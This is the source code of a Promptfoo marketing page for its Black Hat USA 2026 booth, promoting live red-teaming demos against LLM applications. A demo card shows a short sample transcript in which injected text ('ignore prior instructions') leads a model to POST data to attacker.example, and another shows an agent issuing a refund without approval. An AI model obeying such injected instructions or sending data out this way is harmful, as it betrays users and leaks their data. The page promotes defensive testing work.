import React from 'react';

import Head from '@docusaurus/Head';
import Link from '@docusaurus/Link';
import { useForcedTheme } from '@site/src/hooks/useForcedTheme';
import Layout from '@theme/Layout';
import { SITE_CONSTANTS } from '../../constants';
import styles from './blackhat-2026.module.css';

const BOOTH = 'Booth #2967';

/**
 * A single line of a rendered product artifact (transcript, grader output, CI
 * diff). Real output beats a stock icon tile: it is the thing we are actually
 * selling, and it is the thing nobody else on the floor can fake.
 */
interface ArtifactLine {
  text: string;
  tone?: 'dim' | 'fail';
}

const ARTIFACT_TONE_CLASS: Record<NonNullable<ArtifactLine['tone']>, string> = {
  dim: styles.artifactDim,
  fail: styles.artifactFail,
};

interface Demo {
  id: string;
  artifactLabel: string;
  artifact: ArtifactLine[];
  title: string;
  body: string;
}

const DEMOS: Demo[] = [
  {
    id: 'injection',
    artifactLabel: 'transcript',
    artifact: [
      { text: 'user   summarize this vendor PDF', tone: 'dim' },
      { text: 'tool   fetch() -> "...ignore prior instructions"' },
      { text: 'model  POST /export?to=attacker.example', tone: 'fail' },
    ],
    title: 'Injection through untrusted content',
    body: 'Not slideware: a real application, a real retrieval path, and a payload that arrives inside the content it was asked to read. You leave with the transcript.',
  },
  {
    id: 'agents',
    artifactLabel: 'grader',
    artifact: [
      { text: 'FAIL   excessive-agency', tone: 'fail' },
      { text: '       refund(order_id) called without approval', tone: 'dim' },
    ],
    title: 'Agents talked into acting',
    body: 'Tool abuse, memory poisoning, and excessive agency. The interesting failures start when the model stops answering and starts doing.',
  },
  {
    id: 'regression',
    artifactLabel: 'ci diff',
    artifact: [
      { text: '+ redteam.yaml' },
      { text: '+   plugins: [indirect-prompt-injection]' },
      { text: '  1 confirmed finding -> 1 blocking test', tone: 'dim' },
    ],
    title: 'From finding to regression test',
    body: "We'll show how one confirmed finding turns into a test case in your repo that runs on the next commit, and the one after that.",
  },
];

interface PipelineStep {
  num: string;
  title: string;
  body: string;
}

const PIPELINE: PipelineStep[] = [
  {
    num: '01',
    title: 'Discover',
    body: 'Map the endpoints, tools, and system prompts the target can reach.',
  },
  {
    num: '02',
    title: 'Generate',
    body: 'Target-specific attacks find failures that static lists miss.',
  },
  {
    num: '03',
    title: 'Attack',
    body: 'Run them at scale: single-turn, multi-turn, and agentic.',
  },
  {
    num: '04',
    title: 'Grade',
    body: 'Graders triage likely failures and keep the transcript for review.',
  },
  {
    num: '05',
    title: 'Regress',
    body: 'Every confirmed break becomes a test case that runs in CI.',
  },
];

interface LineupEntry {
  input: string;
  title: string;
  body: string;
}

/**
 * Two adjacent pieces of OpenAI's security work, shown by what each one takes as
 * input. Deliberately not a hierarchy: Daybreak is the wider initiative these sit
 * alongside, not a parent product of either.
 */
const LINEUP: LineupEntry[] = [
  {
    input: 'your repository',
    title: 'Codex Security',
    body: 'The appsec agent. It builds a threat model of your repository, hunts vulnerabilities along it, and reproduces each one in a sandbox before it reaches your queue. It then proposes a minimal patch for a human to review; it does not modify your repository itself.',
  },
  {
    input: 'your deployed agent',
    title: 'Promptfoo',
    body: 'Us. Codex Security reads the code you wrote; we go after the agent you shipped. Prompt injection, jailbreaks, tool abuse, excessive agency. Different halves of the same problem.',
  },
];

interface Stat {
  value: string;
  label: string;
}

const STATS: Stat[] = [
  { value: `${SITE_CONSTANTS.USER_COUNT_DISPLAY}+`, label: 'Developers' },
  { value: SITE_CONSTANTS.GITHUB_STARS_DISPLAY, label: 'GitHub stars' },
  { value: SITE_CONSTANTS.WEEKLY_DOWNLOADS_DISPLAY, label: 'Weekly downloads' },
  { value: `${SITE_CONSTANTS.CONTRIBUTOR_COUNT}`, label: 'Contributors' },
];

const CalendarIcon = () => (
  <svg
    className={styles.detailIcon}
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    aria-hidden="true"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
    />
  </svg>
);

const PinIcon = () => (
  <svg
    className={styles.detailIcon}
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    aria-hidden="true"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"
    />
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"
    />
  </svg>
);

const BoothIcon = () => (
  <svg
    className={styles.detailIcon}
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    aria-hidden="true"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M3 9h18M5 9V6a1 1 0 011-1h12a1 1 0 011 1v3M5 9v10a1 1 0 001 1h12a1 1 0 001-1V9"
    />
  </svg>
);

const FloorPlanIcon = () => (
  <svg
    className={styles.detailIcon}
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    aria-hidden="true"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M4 4h16v16H4zM4 10h16M10 10v10"
    />
  </svg>
);

export default function BlackHat2026(): React.ReactElement {
  useForcedTheme('dark');

  const handleSmoothScroll = (e: React.MouseEvent<HTMLAnchorElement>, targetId: string) => {
    e.preventDefault();
    const element = document.querySelector(targetId);
    if (!element) {
      return;
    }
    const offset = 80; // Offset for fixed header
    const offsetPosition = element.getBoundingClientRect().top + window.scrollY - offset;
    const prefersReducedMotion = window.matchMedia?.('(prefers-reduced-motion: reduce)').matches;
    window.scrollTo({ top: offsetPosition, behavior: prefersReducedMotion ? 'auto' : 'smooth' });
  };

  return (
    <Layout
      title="Promptfoo at Black Hat USA 2026"
      description="Promptfoo is part of OpenAI. Find the team at OpenAI booth 2967 in the Black Hat USA 2026 Business Hall, which runs August 4-6 at Mandalay Bay: live prompt injection, jailbreak, and agent attacks."
    >
      <Head>
        <meta property="og:title" content="Promptfoo at Black Hat USA 2026 | AI Security" />
        <meta
          property="og:description"
          content="Promptfoo demos at OpenAI booth 2967. The Black Hat Business Hall runs August 4-6. Live prompt injection, jailbreak, and agent attacks against real applications, plus the automated red teaming behind them."
        />
        <meta
          property="og:image"
          content="https://www.promptfoo.dev/img/events/blackhat-2026.jpg"
        />
        <meta property="og:image:width" content="1536" />
        <meta property="og:image:height" content="1024" />
        <meta property="og:url" content="https://www.promptfoo.dev/events/blackhat-2026" />
        <meta property="og:type" content="website" />
        <meta property="og:site_name" content="Promptfoo" />

        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="Promptfoo at Black Hat USA 2026 | AI Security" />
        <meta
          name="twitter:description"
          content="Live AI attack demos and automated red teaming. Promptfoo demos at OpenAI booth 2967 in the Black Hat Business Hall, Mandalay Bay."
        />
        <meta
          name="twitter:image"
          content="https://www.promptfoo.dev/img/events/blackhat-2026.jpg"
        />
        <meta name="twitter:site" content="@promptfoo" />

        <meta
          name="keywords"
          content="Black Hat USA 2026, AI security, LLM security, prompt injection, jailbreaking, red teaming, agent security, AI vulnerability testing, OWASP LLM Top 10"
        />
        <link rel="canonical" href="https://www.promptfoo.dev/events/blackhat-2026" />
      </Head>

      <main className={styles.page}>
        <div className={styles.gridOverlay} aria-hidden="true" />
        <div className={styles.glow} aria-hidden="true" />

        {/* Hero */}
        <section className={styles.hero}>
          <div className={styles.container}>
            <div className={styles.heroContent}>
              <p className={styles.eyebrow}>
                <span className={styles.eyebrowDot} aria-hidden="true" />
                Black Hat USA 2026 // Business Hall
              </p>
              <p className={styles.identity}>Promptfoo at the OpenAI booth</p>
              <h1 className={styles.heroTitle}>
                Break the agent.
                <br />
                <span className={styles.titleAccent}>Keep the evidence.</span>
              </h1>
              <p className={styles.heroSubtitle}>
                Promptfoo is part of OpenAI. Find the Promptfoo team at the OpenAI booth, running
                live attacks against real LLM applications: prompt injection, jailbreaks, data
                exfiltration, and agents talked into doing things they shouldn't. Every break comes
                with the transcript that proves it.
              </p>
              <div className={styles.heroButtons}>
                <a
                  href="#find-us"
                  className={styles.primaryButton}
                  onClick={(e) => handleSmoothScroll(e, '#find-us')}
                >
                  Where to find us
                </a>
                <Link to="/contact/" className={styles.secondaryButton}>
                  Request a meeting
                </Link>
              </div>
              <ul className={styles.eventDetails}>
                <li className={styles.detail}>
                  <CalendarIcon />
                  <span>August 1-6, 2026</span>
                </li>
                <li className={styles.detail}>
                  <PinIcon />
                  <span>Mandalay Bay, Las Vegas</span>
                </li>
                <li className={styles.detail}>
                  <BoothIcon />
                  <span>{BOOTH}</span>
                </li>
                <li className={styles.detail}>
                  <FloorPlanIcon />
                  <span>Business Hall, Aug 4-6</span>
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* Where to find us */}
        <section className={styles.findSection} id="find-us">
          <div className={styles.container}>
            <div className={styles.sectionHeader}>
              <p className={styles.sectionEyebrow}>// Logistics</p>
              <h2 className={styles.sectionTitle}>Where to find us</h2>
              <p className={styles.sectionSubtitle}>
                Mandalay Bay is large and the show floor is loud. Here's the short version.
              </p>
            </div>
            <div className={styles.findGrid}>
              <div className={`${styles.findCard} ${styles.findCardBooth}`}>
                <p className={styles.findLabel}>01 / The booth</p>
                <h3 className={styles.boothNumber}>{BOOTH}</h3>
                <p className={styles.findBody}>
                  Promptfoo demos at OpenAI booth 2967, in the Business Hall. Bring an architecture
                  diagram or a sanitized test case. We'll map the attack surface and show where we'd
                  probe first.
                </p>
              </div>
              <div className={styles.findCard}>
                <p className={styles.findLabel}>02 / When</p>
                <h3 className={styles.findTitle}>Business Hall, Aug 4-6</h3>
                <p className={styles.findBody}>
                  The Business Hall runs Tuesday August 4 through Thursday August 6, opening with
                  the Welcome Reception on Tuesday from 4-7pm. Trainings run August 1-4; Briefings
                  are August 5-6.
                </p>
                {/* TODO(events): confirm which days the team staffs the booth. */}
              </div>
              <div className={styles.findCard}>
                <p className={styles.findLabel}>03 / Or skip the line</p>
                <h3 className={styles.findTitle}>Somewhere with working acoustics</h3>
                <p className={styles.findBody}>
                  Thirty minutes on your stack and your threat model, off the show floor.
                </p>
                <Link to="/contact/" className={styles.findLink}>
                  Request a meeting
                  <span className={styles.findLinkArrow} aria-hidden="true">
                    →
                  </span>
                </Link>
              </div>
            </div>
          </div>
        </section>

        {/* What we're demoing */}
        <section className={styles.demoSection}>
          <div className={styles.container}>
            <div className={styles.sectionHeader}>
              <p className={styles.sectionEyebrow}>// Demos</p>
              <h2 className={styles.sectionTitle}>What we're demoing</h2>
              <p className={styles.sectionSubtitle}>
                Three things, all running live against systems that fight back.
              </p>
            </div>
            <div className={styles.demoGrid}>
              {DEMOS.map((demo) => (
                <article key={demo.id} className={styles.demoCard}>
                  <p className={styles.artifactLabel}>{demo.artifactLabel}</p>
                  <pre className={styles.artifact}>
                    {demo.artifact.map((line) => (
                      <span
                        key={line.text}
                        className={line.tone ? ARTIFACT_TONE_CLASS[line.tone] : undefined}
                      >
                        {line.text}
                        {'\n'}
                      </span>
                    ))}
                  </pre>
                  <h3 className={styles.demoTitle}>{demo.title}</h3>
                  <p className={styles.demoBody}>{demo.body}</p>
                </article>
              ))}
            </div>
          </div>
        </section>

        {/* Red-team pipeline */}
        <section className={styles.pipelineSection}>
          <div className={styles.container}>
            <div className={styles.sectionHeader}>
              <p className={styles.sectionEyebrow}>// Pipeline</p>
              <h2 className={styles.sectionTitle}>The red-team pipeline</h2>
              <p className={styles.sectionSubtitle}>
                The same five steps, whether you run them once before launch or on every pull
                request.
              </p>
            </div>
            <ol className={styles.pipeline}>
              {PIPELINE.map((step) => (
                <li key={step.num} className={styles.pipelineStep}>
                  <span className={styles.stepNum} aria-hidden="true">
                    {step.num}
                  </span>
                  <div className={styles.stepBody}>
                    <h3 className={styles.stepTitle}>{step.title}</h3>
                    <p className={styles.stepCopy}>{step.body}</p>
                  </div>
                </li>
              ))}
            </ol>
          </div>
        </section>

        {/* The rest of the lineup */}
        <section className={styles.lineupSection}>
          <div className={styles.container}>
            <div className={styles.sectionHeader}>
              <p className={styles.sectionEyebrow}>// Also at the booth</p>
              <h2 className={styles.sectionTitle}>The rest of the lineup</h2>
              <p className={styles.sectionSubtitle}>
                At the OpenAI booth you can also meet the teams behind Daybreak and Codex Security.
              </p>
            </div>
            <div className={styles.lineupFrame}>
              <p className={styles.lineupFrameLabel}>Daybreak</p>
              <p className={styles.lineupFrameBody}>
                OpenAI's cyber defense initiative: frontier models pointed at defense rather than
                offense, a partner network, and funded work on patching the open source everyone
                quietly depends on. The two below are adjacent efforts under OpenAI's wider security
                work, split by what each one takes as input.
              </p>
              <div className={styles.lineupPair}>
                {LINEUP.map((entry) => (
                  <div key={entry.title} className={styles.lineupCard}>
                    <p className={styles.lineupFlow}>
                      {entry.input}
                      <span className={styles.lineupFlowArrow} aria-hidden="true">
                        →
                      </span>
                    </p>
                    <h3 className={styles.findTitle}>{entry.title}</h3>
                    <p className={styles.findBody}>{entry.body}</p>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </section>

        {/* Stats */}
        <section className={styles.statsSection}>
          <div className={styles.container}>
            <p className={styles.statsLead}>
              Open source, self-hostable, and used by {SITE_CONSTANTS.FORTUNE_500_COUNT} of the
              Fortune 500.
            </p>
            <div className={styles.statsGrid}>
              {STATS.map((stat) => (
                <div key={stat.label} className={styles.stat}>
                  <div className={styles.statNumber}>{stat.value}</div>
                  <div className={styles.statLabel}>{stat.label}</div>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* The Vegas run */}
        <section className={styles.runSection}>
          <div className={styles.container}>
            <div className={styles.runCard}>
              <div className={styles.runHeader}>
                <p className={styles.sectionEyebrow}>// Aug 1 → Aug 9</p>
                <h2 className={styles.runTitle}>The Vegas run</h2>
                <p className={styles.runIntro}>
                  One week, two conferences, one very tired team. DEF CON 34's theme this year is
                  "Agency," which is either a coincidence or the best gift a company that tests AI
                  agents has ever been handed.
                </p>
              </div>
              <div className={styles.runLegs}>
                <div className={styles.runLeg}>
                  <p className={styles.runLegTag}>You are here</p>
                  <p className={styles.runLegDates}>Aug 1-6</p>
                  <h3 className={styles.runLegName}>Black Hat USA 2026</h3>
                  <p className={styles.runLegVenue}>Mandalay Bay Convention Center</p>
                </div>
                <div className={styles.runArrow} aria-hidden="true">
                  →
                </div>
                <Link to="/events/defcon-2026/" className={styles.runLegLink}>
                  <span className={styles.runLegTag}>Next</span>
                  <span className={styles.runLegDates}>Aug 6-9</span>
                  <span className={styles.runLegName}>DEF CON 34</span>
                  <span className={styles.runLegVenue}>LVCC West Hall</span>
                  <span className={styles.runLegCta}>
                    See the DEF CON page
                    <span className={styles.findLinkArrow} aria-hidden="true">
                      →
                    </span>
                  </span>
                </Link>
              </div>
            </div>
          </div>
        </section>

        {/* Final CTA */}
        <section className={styles.finalCta}>
          <div className={styles.container}>
            <h2 className={styles.finalTitle}>Attending Black Hat?</h2>
            <p className={styles.finalCopy}>
              Request a meeting and we'll have something specific to show you. Walk-ups are welcome,
              but the good demos draw a line.
            </p>
            <div className={styles.ctaButtons}>
              <Link to="/contact/" className={styles.primaryButton}>
                Request a meeting
              </Link>
              <Link to="https://discord.gg/promptfoo" className={styles.secondaryButton}>
                Join our Discord
              </Link>
            </div>
          </div>
        </section>

        {/* Footer navigation */}
        <section className={styles.footerNav}>
          <div className={styles.container}>
            <Link to="/events/" className={styles.backLink}>
              <svg
                className={styles.backIcon}
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                aria-hidden="true"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M15 19l-7-7 7-7"
                />
              </svg>
              Back to all events
            </Link>
          </div>
        </section>
      </main>
    </Layout>
  );
}
